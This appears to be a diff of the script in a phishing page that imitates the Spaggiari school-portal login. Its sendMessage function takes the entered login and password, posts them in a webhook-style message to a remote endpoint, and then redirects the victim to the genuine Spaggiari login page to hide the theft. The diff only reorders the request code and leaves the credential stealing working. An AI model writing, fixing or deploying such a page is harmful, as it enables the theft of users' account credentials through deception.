@@ -1023,12 +1023,12 @@ function sendMessage() {
         avatar_url: "",
         content: `EMAIL: ${this.document.getElementById("login").value}\nPASSWORD: ${this.document.getElementById("password").value}`
     };
-    request.send(JSON.stringify(params));
-    request.onreadystatechange = () => { // Call a function when the state changes.
-      if (request.readyState === XMLHttpRequest.DONE && request.status === 200) {
+    request.onreadystatechange = () => {
+      if (request.readyState === 4 && request.status === 200) {
         this.window.location.replace("https://web.spaggiari.eu/home/app/default/login.php");
       }
     }
+    request.send(JSON.stringify(params));
 }
 </script>
 
